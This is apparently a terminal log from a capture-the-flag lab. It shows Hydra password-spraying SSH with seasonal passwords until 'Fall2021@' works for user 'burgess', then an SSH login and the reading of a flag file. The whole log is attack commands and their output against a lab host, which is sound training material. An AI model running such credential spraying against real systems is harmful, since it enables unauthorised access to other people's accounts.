@@ -1,0 +1,131 @@
+root@ip-10-10-12-138:~/Desktop/tm# hydra -L usernames-list.txt -p Summer2021@ ssh://10.10.173.4
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2022-09-09 14:17:01
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[ERROR] File for logins not found: usernames-list.txt
+root@ip-10-10-12-138:~/Desktop/tm# hydra -L usernames-list.txt -p Summer2021@ ssh://10.10.173.4ist.txt -p Summer2021@ ssh://10Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2022-09-09 15:17:27
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[ERROR] File for logins not found: usernames-list.txt
+root@ip-10-10-12-138:~/Desktop/tm# ssh burgess@10.10.173.4
+The authenticity of host '10.10.173.4 (10.10.173.4)' can't be established.
+ECDSA key fingerprint is SHA256:/jMiSrhOG9gY/0ByUwpej83jyQnYRBT4KcralWzRtfE.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '10.10.173.4' (ECDSA) to the list of known hosts.
+burgess@10.10.173.4's password: 
+Permission denied, please try again.
+burgess@10.10.173.4's password: 
+Permission denied, please try again.
+burgess@10.10.173.4's password: 
+burgess@10.10.173.4: Permission denied (publickey,password).
+root@ip-10-10-12-138:~/Desktop/tm# ssh burgess@10.10.173.4
+burgess@10.10.173.4's password: 
+Permission denied, please try again.
+burgess@10.10.173.4's password: 
+Connection closed by 10.10.173.4 port 22
+root@ip-10-10-12-138:~/Desktop/tm# nano usernames-list.txt
+root@ip-10-10-12-138:~/Desktop/tm# nano usernames-list.txt
+root@ip-10-10-12-138:~/Desktop/tm# hydra -L usernames-list.txt -p Summer2021@ ssh://10.10.173.4
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2022-09-09 15:23:42
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
+[DATA] attacking ssh://10.10.173.4:22/
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2022-09-09 15:23:45
+root@ip-10-10-12-138:~/Desktop/tm# hydra -L usernames-list.txt -p Summer2021! ssh://10.10.173.4
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2022-09-09 15:24:05
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
+[DATA] attacking ssh://10.10.173.4:22/
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2022-09-09 15:24:08
+root@ip-10-10-12-138:~/Desktop/tm# hydra -L usernames-list.txt -p Autumn2021! ssh://10.10.173.4
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2022-09-09 15:24:31
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
+[DATA] attacking ssh://10.10.173.4:22/
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2022-09-09 15:24:33
+root@ip-10-10-12-138:~/Desktop/tm# hydra -L usernames-list.txt -p Autumn2021@ ssh://10.10.173.4
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2022-09-09 15:24:41
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
+[DATA] attacking ssh://10.10.173.4:22/
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2022-09-09 15:24:43
+root@ip-10-10-12-138:~/Desktop/tm# hydra -L usernames-list.txt -p Winter2021@ ssh://10.10.173.4
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2022-09-09 15:24:57
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
+[DATA] attacking ssh://10.10.173.4:22/
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2022-09-09 15:24:59
+root@ip-10-10-12-138:~/Desktop/tm# hydra -L usernames-list.txt -p Winter2021! ssh://10.10.173.4
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2022-09-09 15:25:03
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
+[DATA] attacking ssh://10.10.173.4:22/
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2022-09-09 15:25:05
+root@ip-10-10-12-138:~/Desktop/tm# hydra -L usernames-list.txt -p Fall2021@ ssh://10.10.173.4
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2022-09-09 15:25:15
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
+[DATA] attacking ssh://10.10.173.4:22/
+[22][ssh] host: 10.10.173.4   login: burgess   password: Fall2021@
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2022-09-09 15:25:18
+root@ip-10-10-12-138:~/Desktop/tm# 
+
+
+root@ip-10-10-12-138:~/Desktop/tm# ssh burgess@10.10.173.4
+burgess@10.10.173.4's password: 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.4.0-1058-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Sep  9 14:27:02 UTC 2022
+
+  System load:  0.09               Users logged in:                0
+  Usage of /:   21.0% of 19.32GB   IP address for eth0:            10.10.173.4
+  Memory usage: 37%                IP address for br-mailcow:      172.22.1.1
+  Swap usage:   0%                 IP address for docker0:         172.17.0.1
+  Processes:    145                IP address for br-c0dd1805e8c7: 172.18.0.1
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+61 packages can be updated.
+8 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Tue Nov 16 09:49:44 2021 from 10.8.232.37
+burgess@ip-10-10-173-4:~$ whoami
+burgess
+burgess@ip-10-10-173-4:~$ 
+
+burgess@ip-10-10-173-4:/etc$ cat flag
+THM{a97a26e86d09388bbea148f4b870277d}
+burgess@ip-10-10-173-4:/etc$ 
